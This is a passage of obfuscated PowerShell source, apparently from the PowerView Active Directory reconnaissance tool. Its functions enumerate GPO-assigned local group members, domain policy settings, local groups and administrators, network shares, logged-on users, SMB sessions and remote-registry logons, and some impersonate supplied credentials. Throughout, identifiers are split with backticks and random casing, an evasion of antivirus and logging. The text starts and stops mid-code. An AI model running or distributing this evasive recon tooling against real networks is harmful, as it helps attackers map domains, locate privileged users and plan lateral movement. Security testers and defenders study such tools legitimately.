                ${Gpo`GU`IDs} | Get-`DOMAIN`gPOLO`C`Alg`R`oup @CommonArguments | sO`Rt`-oBj`EcT -Property g`Po`NAme -Unique | forEaCh-`obJ`E`ct {
                    ${G`PoGr`oup} = ${_}

                    if(${G`pO`group}.GroupMembers) {
                        ${G`pOmEmBe`RS} = ${G`Pog`RouP}.GroupMembers
                    }
                    else {
                        ${GpO`meMbe`RS} = ${Gp`OGRO`UP}.GroupSID
                    }

                    ${GpO`meMb`ERs} | f`OreAC`h-O`BJ`eCT {
                        ${O`BJe`cT} = g`eT`-dOMain`OBJE`ct @CommonArguments -Identity ${_}
                        ${i`SGr`OuP} = @('268435456','268435457','536870912','536870913') -contains ${o`BJ`Ect}.samaccounttype

                        ${gPocOMP`UtErl`O`Ca`LG`ROup`MemB`ER} = New-o`BJe`Ct p`s`ObJEct
                        ${G`po`co`M`PUT`e`RLOC`AlgrOupmEmBer} | AdD`-m`eMbEr no`TEp`RO`PErTy 'ComputerName' ${Co`MPu`TeR}.dnshostname
                        ${GpOC`OmP`UTEr`LOcalgr`o`UPm`emBER} | a`Dd-`MemBeR NOte`PrOpe`RTy 'ObjectName' ${OB`jE`Ct}.samaccountname
                        ${GpoComP`UTerlo`C`ALgRO`UPME`mb`Er} | ADd-MEm`B`er n`Ote`PrOpeRTY 'ObjectDN' ${ObJE`cT}.distinguishedname
                        ${GpOCOM`P`Ut`Er`lO`Ca`LgrOUp`MEMb`eR} | add-mem`B`er noT`ep`ROpER`TY 'ObjectSID' ${_}
                        ${gPoCo`mp`UTerLOCA`lgRo`UpMemBEr} | A`d`D-mEmbEr N`OTEPROPEr`Ty 'IsGroup' ${isg`RoUP}
                        ${gP`OcOmpU`TE`RlOcaLG`RO`UPMeM`Ber} | ADD`-MEM`B`Er N`oTEpro`pe`RTY 'GPODisplayName' ${g`p`oGRO`UP}.GPODisplayName
                        ${g`PocO`mpUter`l`ocALgR`oup`MEMber} | a`dd-M`EMBer noTEP`ROP`ERty 'GPOGuid' ${GPog`RO`UP}.GPOName
                        ${gpoCOMp`Ut`eR`LO`caLg`RouPmemBeR} | A`dD-mEM`BeR NO`TePR`oP`ERty 'GPOPath' ${gPOg`RoUp}.GPOPath
                        ${GP`O`COMpU`TErLocAlG`RO`UpmemBeR} | Add-`m`emB`er noT`Epro`perTY 'GPOType' ${Gpo`g`RO`UP}.GPOType
                        ${GP`oCOMPuteRlOCAL`G`R`OU`PM`E`M`BER}.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        ${GpocomP`U`TER`LoC`ALgroUpmEmbEr}
                    }
                }
            }
        }
    }
}


function GeT-DO`MaI`N`p`olICydAtA {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`Rue}, ValueFromPipelineByPropertyName = ${TR`UE})]
        [Alias('Source', 'Name')]
        [String]
        ${p`OLI`CY} = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sE`Rver},

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ERvErTImel`IM`it},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`Ed`eNT`iaL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${s`Sl},

        [Switch]
        ${Ob`Fu`ScAte}
    )

    BEGIN {
        ${SeAr`CH`EraRg`UMe`NtS} = @{}
        if (${pSboUND`pAr`AmetE`RS}['Server']) { ${sEARcHe`RAR`gum`enTs}['Server'] = ${se`Rv`eR} }
        if (${PSBO`U`N`dParAmeTE`Rs}['ServerTimeLimit']) { ${s`Ea`RCHerA`RGU`meNTs}['ServerTimeLimit'] = ${Serv`e`RtimE`lI`mit} }
        if (${pSB`oU`NDP`ARamet`Ers}['Credential']) { ${S`EA`RcHErARGU`ME`N`Ts}['Credential'] = ${cr`ed`En`TIal} }
        if (${PSBO`UNdp`ArAme`T`ERs}['SSL']) { ${SEA`Rc`HerA`RgUmentS}['SSL'] = ${S`SL} }
        if (${p`sB`oUNDpAr`AM`eTErS}['Obfuscate']) {${SEARChErArG`U`ME`Nts}['Obfuscate'] = ${ob`FUSc`AtE} }

        ${C`onverTa`RG`UMeN`Ts} = @{}
        if (${p`sB`oUNDPaRA`m`e`TerS}['Server']) { ${COnVEr`Ta`R`G`UMENTs}['Server'] = ${S`erVER} }
        if (${PsbOU`N`dPArA`mEterS}['Credential']) { ${cONVE`RTa`RGu`M`e`NTs}['Credential'] = ${CR`edeNT`i`AL} }
    }

    PROCESS {
        if (${psbound`pArame`T`eRS}['Domain']) {
            ${SE`ArcheR`A`RG`UmE`Nts}['Domain'] = ${DOMA`IN}
            ${conVERt`Ar`GuM`EN`Ts}['Domain'] = ${do`Ma`iN}
        }

        if (${poLI`cy} -eq 'All') {
            ${SE`Arche`R`ArGuMEN`Ts}['Identity'] = '*'
        }
        elseif (${p`OLICy} -eq 'Domain') {
            ${s`earc`h`e`RArgUme`Nts}['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif ((${Pol`iCy} -eq 'DomainController') -or (${P`ol`IcY} -eq 'DC')) {
            ${Se`Ar`chEr`ARGumENtS}['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            ${S`EaRCHeRA`R`gumentS}['Identity'] = ${P`oli`cY}
        }

        ${GPoR`eS`U`ltS} = GET-`DOM`AINg`Po @SearcherArguments

        ForEach (${g`Po} in ${Gpore`s`ULTS}) {
            
            ${gpTtMp`Lp`ATh} = ${G`pO}.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            ${Pa`RSe`ARgs} =  @{
                'GptTmplPath' = ${GPT`T`m`plpAth}
                'OutputObject' = ${T`Rue}
            }
            if (${P`Sb`OuNdp`ARAMetERs}['Credential']) { ${PaR`se`ArGs}['Credential'] = ${cRe`DeNt`iaL} }

            
            G`et-gpt`T`MPL @ParseArgs | For`e`A`ch-ob`jECT {
                ${_} | ad`D-`Member NOt`epROpe`RTy 'GPOName' ${G`pO}.name
                ${_} | Ad`d-ME`M`BeR nO`TEp`RoPeRty 'GPODisplayName' ${G`PO}.displayname
                ${_}
            }
        }
    }
}










function get`-neTLOC`Algr`o`Up {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`o`MPuTE`RNAME} = ${eNv`:cOmpu`T`erNa`ME},

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        ${me`ThOD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`ED`eNtiAl} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${p`sbouNdPaRA`Met`erS}['Credential']) {
            ${lOGont`ok`eN} = iNvO`kE-u`SEr`iMPERs`ONa`TioN -Credential ${creDE`N`TiAL}
        }
    }

    PROCESS {
        ForEach (${c`Omp`UTER} in ${C`OMpu`TeRNa`Me}) {
            if (${MeTh`OD} -eq 'API') {
                

                
                ${Q`U`er`yleVeL} = 1
                ${PtrI`Nfo} = [IntPtr]::Zero
                ${e`NtrI`esrE`Ad} = 0
                ${tOTA`LrE`AD} = 0
                ${r`e`SuMe`HanDLE} = 0

                
                ${R`E`SuLt} = ${N`ET`API`32}::NetLocalGroupEnum(${COmp`U`TEr}, ${Qu`e`R`yLeVEL}, [ref]${Pt`RINfO}, -1, [ref]${enTrI`esR`ead}, [ref]${t`OtaLr`eAD}, [ref]${re`suM`EhanD`le})

                
                ${O`Ff`SEt} = ${ptRIn`Fo}.ToInt64()

                
                if ((${ReSu`LT} -eq 0) -and (${O`F`FSEt} -gt 0)) {

                    
                    ${In`CR`EmEnT} = ${LocAL`G`Rou`P_INFO`_1}::GetSize()

                    
                    for (${i} = 0; (${i} -lt ${EN`T`RiES`ReAd}); ${i}++) {
                        
                        ${N`EWiNT`ptR} = NE`w-o`BJecT sYS`Te`m`.inTptr -ArgumentList ${o`FFs`Et}
                        ${i`NFo} = ${NE`wI`NTpTr} -as ${LOcAlG`RoUP`_`InFo_1}

                        ${Off`S`et} = ${new`IN`T`pTr}.ToInt64()
                        ${o`FFS`et} += ${I`N`CremEnt}

                        ${LoC`AlGr`Oup} = New`-o`Bj`ecT pS`Obj`ECt
                        ${L`ocALG`Roup} | a`dd-MEmb`Er noTe`pr`OPE`Rty 'ComputerName' ${Co`MP`Uter}
                        ${L`Oc`ALGROUP} | adD-ME`MB`er notEp`RoPER`TY 'GroupName' ${in`FO}.lgrpi1_name
                        ${lO`CalG`Roup} | A`DD`-MembEr NoTE`pRop`ER`TY 'Comment' ${i`Nfo}.lgrpi1_comment
                        ${LOcalGr`o`UP}.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        ${LOc`Al`gRoUP}
                    }
                    
                    ${n`UlL} = ${nEtaP`i32}::NetApiBufferFree(${pt`R`INFo})
                }
                else {
                    WRIte`-`VE`RboSE "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                
                ${C`ompuTE`RPr`oVIDER} = [ADSI]"WinNT://$Computer,computer"

                ${c`OmPUTE`Rp`R`ovider}.psbase.children | w`h`ErE-ob`JECt { ${_}.psbase.schemaClassName -eq 'group' } | fORe`ACH-`oBJE`cT {
                    ${LO`caLG`ROuP} = ([ADSI]${_})
                    ${G`RouP} = nE`W`-object p`SOBJE`CT
                    ${Gr`Oup} | ADD`-mEmB`Er nOtEP`R`oPeR`Ty 'ComputerName' ${c`OMPuteR}
                    ${gro`Up} | aDD-`m`eMBer NOtE`p`RopErty 'GroupName' (${LO`CAlg`R`oup}.InvokeGet('Name'))
                    ${g`Ro`Up} | add`-mem`BeR nOtEPRo`pe`R`TY 'SID' ((New-oB`Je`Ct sYs`Tem`.`sE`Cur`iTY.p`Rinc`Ipa`l.sECuR`ItY`idenTIfI`er(${L`OcA`lG`ROUp}.InvokeGet('objectsid'),0)).Value)
                    ${g`R`oUP} | aDd`-Mem`BER not`ePr`OPE`RTy 'Comment' (${lOCal`Gro`UP}.InvokeGet('Description'))
                    ${g`ROUp}.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    ${G`ROuP}
                }
            }
        }
    }
    
    END {
        if (${lo`GoNT`okEn}) {
            INvO`Ke-re`V`ERTtosE`LF -TokenHandle ${lOg`onT`okEN}
        }
    }
}


function G`Et-ne`TLOCA`lGrOUPm`eMbER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUE}, ValueFromPipelineByPropertyName = ${Tr`UE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`o`mpUt`ErNAME} = ${EN`V`:Comp`UTernaME},

        [Parameter(ValueFromPipelineByPropertyName = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${gRouPN`A`ME} = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        ${M`Et`hOD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`De`NtIaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${Psb`o`U`NDpar`Am`eteRs}['Credential']) {
            ${l`OGonT`O`kEN} = INv`OKE-U`sER`i`MPErS`oNAt`I`On -Credential ${cReDEnT`I`AL}
        }
    }

    PROCESS {
        ForEach (${C`Om`PUTEr} in ${C`omPUtERNA`Me}) {
            if (${MEt`HoD} -eq 'API') {
                

                
                ${QUEryl`e`Vel} = 2
                ${PtRI`N`FO} = [IntPtr]::Zero
                ${E`NTR`iesReAd} = 0
                ${t`oTal`REaD} = 0
                ${RE`SUmehA`N`DLE} = 0

                
                ${ReSU`LT} = ${ne`T`Api`32}::NetLocalGroupGetMembers(${C`OMp`UTER}, ${GrOU`P`Na`ME}, ${QueRyL`E`VeL}, [ref]${p`TRi`NfO}, -1, [ref]${ENtRI`esr`e`AD}, [ref]${t`OTaLre`Ad}, [ref]${RE`sU`MEhANd`LE})

                
                ${OfFS`et} = ${pTRI`NfO}.ToInt64()

                ${M`EMb`erS} = @()

                
                if ((${Res`ULt} -eq 0) -and (${off`seT} -gt 0)) {

                    
                    ${Inc`R`emEnt} = ${LOcalGR`OUp`_MembEr`S_iNf`O`_2}::GetSize()

                    
                    for (${i} = 0; (${i} -lt ${enTr`i`eSr`EAD}); ${I}++) {
                        
                        ${Ne`Wi`NtpTR} = NE`w-`OBjEcT SY`sTeM.inTP`TR -ArgumentList ${oFF`SET}
                        ${In`FO} = ${neW`i`Nt`PtR} -as ${L`ocAl`gRoUp_memB`ErS`_InF`O_2}

                        ${o`FfSEt} = ${nEwi`N`TPTr}.ToInt64()
                        ${ofF`s`Et} += ${inc`REME`Nt}

                        ${s`idS`TrI`NG} = ''
                        ${R`e`SUlt2} = ${Ad`V`API`32}::ConvertSidToStringSid(${i`Nfo}.lgrmi2_sid, [ref]${s`IdSTRI`NG});${LaSTE`Rr`or} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if (${R`Es`ULt2} -eq 0) {
                            w`RItE-V`eR`BO`sE "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            ${MemB`eR} = new`-Ob`jeCT ps`OBJe`CT
                            ${mE`mbEr} | Add-`ME`mb`Er nOTE`Prop`Erty 'ComputerName' ${cO`mpuTEr}
                            ${MEM`B`Er} | a`dd`-MemBer NoTe`proPE`RtY 'GroupName' ${G`R`oupNAmE}
                            ${Me`M`BEr} | ADD-M`em`BEr noTEPR`oP`e`RTy 'MemberName' ${i`NfO}.lgrmi2_domainandname
                            ${ME`M`Ber} | AdD`-mEmb`ER n`O`T`eprOPeRTY 'SID' ${s`IDS`Tr`ING}
                            ${i`s`GrOuP} = $(${I`Nfo}.lgrmi2_sidusage -eq 'SidTypeGroup')
                            ${mE`mb`eR} | Add-MEm`B`eR N`OtEP`ROpERtY 'IsGroup' ${I`SgR`oUp}
                            ${M`e`mBer}.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            ${ME`mb`erS} += ${M`Emb`ER}
                        }
                    }

                    
                    ${N`UlL} = ${netAP`I`32}::NetApiBufferFree(${pTRI`N`FO})

                    
                    ${MaChI`Nes`iD} = ${M`Emb`ERS} | wh`ER`e-oBJ`EcT {${_}.SID -match '.*-500' -or (${_}.SID -match '.*-501')} | S`ELecT-`O`BJEct -Expand S`ID
                    if (${ma`chIN`ESid}) {
                        ${m`AC`hIneS`iD} = ${MAcH`Ine`S`Id}.Substring(0, ${M`AC`hin`esID}.LastIndexOf('-'))

                        ${m`E`mbERS} | F`orE`AcH-Obj`ECT {
                            if (${_}.SID -match ${M`AcHine`sID}) {
                                ${_} | add-M`Emb`ER nOtE`prOPER`Ty 'IsDomain' ${f`AlSE}
                            }
                            else {
                                ${_} | ADd-mEm`B`ER NoTEP`RoPER`TY 'IsDomain' ${T`Rue}
                            }
                        }
                    }
                    else {
                        ${M`EMb`ERS} | FOrEA`CH-O`B`JEct {
                            if (${_}.SID -notmatch 'S-1-5-21') {
                                ${_} | ADd`-MEMB`Er not`EPR`op`ErTy 'IsDomain' ${Fa`lsE}
                            }
                            else {
                                ${_} | aDd-MEm`B`ER NoT`eProp`ErTy 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    ${m`Embe`Rs}
                }
                else {
                    Wr`i`TE-ve`R`BOSe "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                
                try {
                    ${Gr`Oupp`Ro`Vi`der} = [ADSI]"WinNT://$Computer/$GroupName,group"

                    ${g`R`o`UPP`ROViDer}.psbase.Invoke('Members') | f`Ore`ACH-o`BjEcT {

                        ${m`Emb`Er} = new-O`Bj`E`CT Pso`BjEct
                        ${mE`m`BEr} | ADd`-MeM`BeR nOt`EpROPEr`TY 'ComputerName' ${C`OMPu`Ter}
                        ${m`EMber} | A`dd`-meMber NOtEP`R`OPeRTY 'GroupName' ${GR`OuPn`Ame}

                        ${L`o`caL`USER} = ([ADSI]${_})
                        ${a`D`SPatH} = ${LOca`lu`sER}.InvokeGet('AdsPath').Replace('WinNT://', '')
                        ${I`SgR`OUP} = (${L`O`cAlUS`eR}.SchemaClassName -like 'group')

                        if(([regex]::Matches(${A`Ds`patH}, '/')).count -eq 1) {
                            
                            ${mE`mb`ER`IsDoMAin} = ${TR`UE}
                            ${NA`me} = ${AdSP`A`TH}.Replace('/', '\')
                        }
                        else {
                            
                            ${mem`BeR`IS`DOMain} = ${fal`se}
                            ${n`Ame} = ${ADsp`A`Th}.Substring(${AD`SP`AtH}.IndexOf('/')+1).Replace('/', '\')
                        }

                        ${m`EMBER} | A`DD-meM`BEr NOt`E`pRo`perTy 'AccountName' ${na`ME}
                        ${ME`Mb`ER} | add`-M`Em`BER nO`T`ePrope`Rty 'SID' ((NE`w-o`BJect SySt`eM.s`eCUR`I`Ty.PrINcipAL.S`ecuRitY`IdE`NTi`Fier(${lo`C`Al`UsER}.InvokeGet('ObjectSID'),0)).Value)
                        ${m`eMBER} | a`dD-M`eMb`ER Note`pr`oPE`RtY 'IsGroup' ${I`sGRO`UP}
                        ${M`EMBEr} | A`Dd-mem`Ber n`oT`ePR`OpeRty 'IsDomain' ${M`e`MberI`sDO`main}

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        ${mEm`BEr}
                    }
                }
                catch {
                    W`R`ite-`VE`RbOSe "[Get-NetLocalGroupMember] Error for $Computer : $_"
                }
            }
        }
    }
    
    END {
        if (${LoGo`N`TOken}) {
            INV`OKE-rEV`e`RTt`oselF -TokenHandle ${LogO`NToK`en}
        }
    }
}


function gEt-nET`s`haRe {


    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUE}, ValueFromPipelineByPropertyName = ${Tr`UE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`MPuTErN`AMe} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`e`dENTIAl} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${Psbo`U`NdPAr`AmeTERS}['Credential']) {
            ${l`oGON`ToK`En} = iN`VoKE-uS`ER`Impe`RsOn`AtI`On -Credential ${cRED`e`NTiAL}
        }
    }

    PROCESS {
        ForEach (${cOmPU`T`Er} in ${C`OmP`U`TeRNa`Me}) {
            
            ${q`UERylE`VeL} = 1
            ${ptrI`N`FO} = [IntPtr]::Zero
            ${E`Nt`RiEsR`EAD} = 0
            ${t`o`TalreAd} = 0
            ${RE`s`UmehAN`dLE} = 0

            
            ${res`U`LT} = ${NE`TAP`I32}::NetShareEnum(${C`OMP`U`TeR}, ${q`UEryl`evEl}, [ref]${pt`RiNfO}, -1, [ref]${enT`RIesR`ead}, [ref]${t`ot`Al`ReAD}, [ref]${rE`S`UM`eHANd`lE})

            
            ${OF`FSet} = ${PT`RinFO}.ToInt64()

            
            if ((${re`SuLt} -eq 0) -and (${O`FF`SEt} -gt 0)) {

                
                ${iNCre`M`EnT} = ${SH`ARe_IN`Fo`_1}::GetSize()

                
                for (${I} = 0; (${i} -lt ${en`Tr`i`eSreAd}); ${i}++) {
                    
                    ${NewiN`TP`TR} = new`-oBJe`CT Sy`sTem.InT`p`TR -ArgumentList ${O`Ff`SET}
                    ${IN`FO} = ${N`ewInTP`Tr} -as ${ShARe_INF`O`_1}

                    
                    ${SHa`Re} = ${IN`FO} | sELeC`T-o`Bj`EcT *
                    ${S`h`ArE} | aDd-MeM`B`Er n`Otepr`o`perty 'ComputerName' ${cO`mpU`TER}
                    ${S`HA`RE}.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    ${off`SET} = ${nE`wiNt`Ptr}.ToInt64()
                    ${OfFS`ET} += ${Inc`RE`m`enT}
                    ${s`HarE}
                }

                
                ${NU`Ll} = ${nEtap`I`32}::NetApiBufferFree(${pT`RInfO})
            }
            else {
                W`RI`T`E-VERb`osE "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if (${l`OGON`Tok`EN}) {
            IN`VoKE-`ReVErT`TOsE`Lf -TokenHandle ${L`oGo`NTo`KEn}
        }
    }
}


function GeT-NE`TlOGged`oN {


    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUE}, ValueFromPipelineByPropertyName = ${Tr`UE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`om`pUtER`NaME} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdEN`TiaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${Ps`BOUnD`PaRaME`T`eRs}['Credential']) {
            ${LO`GONt`O`KEn} = in`V`OK`e`-uS`eriMpe`RsoNAtioN -Credential ${CrEDe`N`TIAL}
        }
    }

    PROCESS {
        ForEach (${C`OMPuT`Er} in ${co`MpU`T`E`RnaME}) {
            
            ${QueR`Yl`ev`el} = 1
            ${pTrI`NFo} = [IntPtr]::Zero
            ${ENTrIe`S`ReAd} = 0
            ${T`OT`ALR`EAD} = 0
            ${rEsUm`EhAND`lE} = 0

            
            ${r`esu`Lt} = ${n`ET`APi32}::NetWkstaUserEnum(${C`OMputER}, ${qU`ERYl`eVeL}, [ref]${p`Tr`info}, -1, [ref]${eNt`R`IeSR`eaD}, [ref]${tot`Al`ReAd}, [ref]${ResU`MEHAND`LE})

            
            ${Of`FsEt} = ${Ptr`iNFO}.ToInt64()

            
            if ((${R`ES`ULT} -eq 0) -and (${o`FFs`Et} -gt 0)) {

                
                ${in`Cre`mE`NT} = ${wKStA_US`Er_i`NF`O_1}::GetSize()

                
                for (${i} = 0; (${i} -lt ${E`NtrIeSRe`Ad}); ${I}++) {
                    
                    ${nEw`iNtp`Tr} = n`ew`-OBjEct S`y`StEm`.iNtpTr -ArgumentList ${O`F`FSEt}
                    ${In`FO} = ${N`ewInTp`Tr} -as ${wkSt`A_USer_IN`F`o_1}

                    
                    ${l`OGG`EdOn} = ${I`Nfo} | Sele`Ct-Ob`jecT *
                    ${lo`gGE`DoN} | aDD`-mem`BeR N`otE`pr`OPErTY 'ComputerName' ${cOM`Put`ER}
                    ${loG`GE`dON}.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    ${O`FfsET} = ${NEwiN`TP`TR}.ToInt64()
                    ${o`F`FSet} += ${I`NCre`MENT}
                    ${LO`G`G`edOn}
                }

                
                ${N`ULl} = ${n`eT`Ap`i32}::NetApiBufferFree(${PTr`Info})
            }
            else {
                wriTE`-VE`RBOSE "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if (${L`o`GONtO`kEn}) {
            iNvOk`e`-RE`Ver`TtOsELf -TokenHandle ${L`O`gOnto`Ken}
        }
    }
}


function GEt`-NeTs`e`sSIOn {


    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${T`RUe})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`om`p`UTernA`me} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Red`eNT`IaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${p`SBoun`DpA`RAM`ete`Rs}['Credential']) {
            ${l`O`GONtoKEn} = iNVOKE-`U`SE`R`iMPERsOn`ATI`on -Credential ${cRE`De`Ntial}
        }
    }

    PROCESS {
        ForEach (${C`O`mpuTeR} in ${coMp`Ut`er`NAMe}) {
            
            ${qU`erY`lEVEL} = 10
            ${Pt`RI`NFo} = [IntPtr]::Zero
            ${entRies`RE`Ad} = 0
            ${toT`A`LReaD} = 0
            ${R`eSuM`E`hAndlE} = 0

            
            ${r`eS`ULt} = ${NEtApI`32}::NetSessionEnum(${C`om`PUTEr}, '', ${USE`R`Name}, ${QU`eRyLe`VEL}, [ref]${p`TRiN`FO}, -1, [ref]${ENtr`iesre`Ad}, [ref]${t`OtalrE`AD}, [ref]${RESU`MeHA`ND`lE})

            
            ${OF`F`SeT} = ${pTRi`N`Fo}.ToInt64()

            
            if ((${resU`Lt} -eq 0) -and (${o`FfS`eT} -gt 0)) {

                
                ${iNcrEm`E`NT} = ${Se`SsiO`N_`iN`FO_10}::GetSize()

                
                for (${I} = 0; (${i} -lt ${eNt`Rie`SRE`AD}); ${I}++) {
                    
                    ${ne`WI`NtpTr} = nEw-o`B`j`eCT sYst`Em.`iNTpTr -ArgumentList ${off`set}
                    ${iN`FO} = ${n`e`w`iNTpTr} -as ${se`s`SION`_info_10}

                    
                    ${sEs`S`ION} = ${IN`FO} | SelE`ct-ob`jEct *
                    ${Ses`s`IoN} | add-`mE`mBer Not`ePROp`ERTy 'ComputerName' ${comP`UtEr}
                    ${se`sS`ion}.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    ${OF`F`Set} = ${nEW`iNT`p`Tr}.ToInt64()
                    ${O`F`FSEt} += ${i`N`crEM`ent}
                    ${ses`SI`ON}
                }

                
                ${N`ULl} = ${nETA`PI32}::NetApiBufferFree(${PT`RIn`Fo})
            }
            else {
                wri`TE-vER`BOsE "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }


    END {
        if (${lOGO`NtO`K`En}) {
            I`NVoke-`R`E`VerTTo`sElf -TokenHandle ${LogoN`To`KEn}
        }
    }
}


function gE`T-rEG`Log`GeDON {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`mpU`TernaME} = 'localhost'
    )

    BEGIN {
        if (${ps`Bou`N`dPArAM`ETers}['Credential']) {
            ${Lo`GOnt`OK`EN} = I`NVO`Ke-uSEriMPErsO`NA`TI`on -Credential ${CREDeN`T`ial}
        }
    }

    PROCESS {
        ForEach (${C`omp`UtEr} in ${c`OMp`UTe`R`NAMe}) {
            try {
                
                ${R`eG} = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$ComputerName")

                
                ${R`eg}.GetSubKeyNames() | whE`R`e-OBje`CT { ${_} -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | fOr`eAc`H`-oBJECt {
                    ${USE`Rname} = c`OnvE`Rt`FrOm-sid -ObjectSID ${_} -OutputType 'DomainSimple'

                    if (${U`sErname}) {
                        ${U`SER`NAmE}, ${u`s`ERDOm`AIn} = ${uS`e`RnaMe}.Split('@')
                    }
                    else {
                        ${Use`R`NamE} = ${_}
                        ${u`SErd`o`mAIN} = ${n`Ull}
                    }

                    ${R`Eg`LoGgEdOnu`ser} = new-`obJe`cT p`soBJ`ECT
                    ${regl`o`Gg`edoN`USEr} | ADD-`ME`MBeR notepROp`eR`Ty 'ComputerName' "$ComputerName"
                    ${R`eG`L`ogg`eDONUser} | A`dD-mEM`BEr NO`TeProP`e`RTY 'UserDomain' ${U`ser`DomAIN}
                    ${reGlOGgEd`O`NuSER} | ad`D-`MEMber NO`T`ePROPErtY 'UserName' ${USeR`N`AMe}
                    ${Reg`L`O`GgEd`oN`USeR} | Add-m`Em`BeR n`O`T`EproPeRTy 'UserSID' ${_}
                    ${reGloG`gedo`N`UsER}.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    ${REg`lOGged`O`NUsEr}
                }
            }
            catch {
                WrIt`E-VErb`o`sE "[Get-RegLoggedOn] Error opening remote registry on '$ComputerName' : $_"
            }
        }
    }

    END {
        if (${L`oGoN`T`OkEn}) {
            in`VO`ke-Rev`eR`TTOSELF -TokenHandle ${logo`Nto`kEN}
        }
    }
}


function ge`T-`NEtRdPSe`SsI`oN {


    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tR`Ue}, ValueFromPipelineByPropertyName = ${T`RUE})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
